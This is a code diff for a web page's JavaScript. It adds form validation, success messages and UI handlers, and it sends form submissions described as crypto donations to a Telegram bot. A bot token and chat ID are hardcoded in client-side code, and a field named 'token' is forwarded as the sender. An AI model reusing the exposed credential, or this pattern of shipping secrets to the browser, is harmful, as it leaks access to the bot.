@@ -1,3 +1,5 @@
+// Prelpuder
+
 document.body.onload = function () {
   setTimeout(function () {
     var preloader = document.getElementById("prelouder");
@@ -7,22 +9,11 @@ document.body.onload = function () {
   }, 1000);
 };
 
+// Form app
+
 const TOKEN = "6677281101:AAHzXCaxCUAHvkIkhprS56LjYoZ9bP-l4gA";
 const CHAT_ID = "-1002078322968";
 const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-// document.getElementById("form_tg").addEventListener("submit", function (e) {
-//   e.preventDefault();
-
-//   let message = `<b> Вы получили пожертвования крипто валютой на сумму ${this.name.value} <b>\n`;
-//   message += `<b> Отправитель: ${this.token.value}<b>\n`;
-//   message += `<b> Пожелания отпрвителя: ${this.text.value}<b> `;
-//   axios.post(URL_API, {
-//     chat_id: CHAT_ID,
-//     parse_mode: html,
-//     text: message,
-//   });
-// });
 
 document.getElementById("form_tg").addEventListener("submit", function (event) {
   event.preventDefault();
@@ -32,12 +23,54 @@ document.getElementById("form_tg").addEventListener("submit", function (event) {
   message += `<b> Пожелания отпрвителя: ${event.target.text.value}<b> `;
 
   message = message.replace(/<[^>]+>/g, "");
-  axios.post(URL_API, {
+
+  const inputs = document.querySelectorAll(".inputs");
+
+  const NosuccessMessage = document.querySelector(".no_success_message");
+  function NoshowSuccessMessage() {
+    NosuccessMessage.classList.remove("no_done_message");
+    setTimeout(() => {
+      NosuccessMessage.classList.add("no_done_message");
+    }, 1000);
+  }
+
+  let isFormValid = true;
+  for (const input of inputs) {
+    if (input.value.trim() === "") {
+      isFormValid = false;
+    }
+  }
+
+  if (!isFormValid) {
+    NoshowSuccessMessage();
+    return false;
+  }
+
+  document.querySelectorAll(".inputs").forEach((inputss) => {
+    inputss.value = "";
+  });
+
+  const successMessage = document.querySelector(".success_message");
+  function showSuccessMessage() {
+    successMessage.classList.remove("done_message");
+    setTimeout(() => {
+      successMessage.classList.add("done_message");
+    }, 1000);
+  }
+
+  const Posts = axios.post(URL_API, {
     chat_id: CHAT_ID,
-    // parse_mode: html,
     text: message,
   });
+
+  if (Posts) {
+    showSuccessMessage();
+  }
+
+  return Posts;
 });
+
+// Card
 
 let cards = document.querySelectorAll(".card");
 cards.forEach((card) => {
@@ -49,7 +82,7 @@ cards.forEach((card) => {
   };
 });
 
-// 538ur893ut9j:2342
+// burger menu
 
 const headerBtn = document.querySelector(".burger_btns");
 const wraperBtn = document.querySelector(".btn_block");
